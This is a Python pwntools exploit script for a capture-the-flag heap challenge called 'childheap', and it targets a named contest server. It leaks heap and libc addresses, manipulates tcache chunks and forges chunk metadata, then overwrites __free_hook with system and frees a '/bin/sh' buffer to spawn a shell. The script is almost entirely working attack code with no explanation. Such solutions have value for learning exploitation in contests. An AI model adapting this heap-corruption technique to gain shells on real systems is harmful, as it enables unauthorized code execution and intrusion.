from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './childheap'
HOST = 'childheap.quals.beginners.seccon.jp'
PORT = 22476

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        # return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()

def alloc(size, text):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(size))
    if size == 0:
        return 
    r.sendafter(': ', text)

def delete(q='y'):
    r.sendlineafter('> ', '2')
    if q == 'y':
        r.sendlineafter('] ', 'y')
    else: 
        r.recvuntil('Content: \'')
        leak = u64(r.recv(6) + '\x00'*2)
        r.sendlineafter('] ', 'n')
        return leak

def wipe():
    r.sendlineafter('> ', '3')

for i in range(7):
    alloc(0x18, 'A')
    delete()
    wipe()
    alloc(0x178, 'a')
    delete()
    wipe()
    alloc(0x18, 'A'*0x10+p64(0))
    wipe()
    alloc(0x178, 'A')
    delete()
    if i == 1:
        leak = delete(q='n')
        dbg("leak")
        heap = leak - 0x280
        dbg("heap")

    wipe()

    
alloc(0x18, flat(heap + 0xe00, heap + 0xe00))
wipe()
alloc(0x48, 'A')
delete()
wipe()
alloc(0x28, 'A')
delete()
wipe()
alloc(0x178, p64(0x21)*(0x178/8))
delete()
wipe()

alloc(0x48, flat(0, 0x51)*3+flat(heap + 0xdb0, heap+0xdb0))
wipe()

alloc(0x28, 'A'*0x20+p64(0x50))
delete()
wipe()

alloc(0x178, 'A')
delete()
wipe()

alloc(0, 'A') 
leak = delete(q='n')
dbg("leak")
base = leak - 0x1e4de0
fh = base + 0x1e75a8
system = base + 0x52fd0
dbg("base")
wipe()
if args.D:
    debug(r, [0xa75])
alloc(0x58, p64(fh))
wipe()
alloc(0x28, p64(system))
wipe()
alloc(0x28, p64(system))
wipe()
alloc(0x28, "/bin/sh")
delete()
r.interactive()



r.interactive()
r.close()
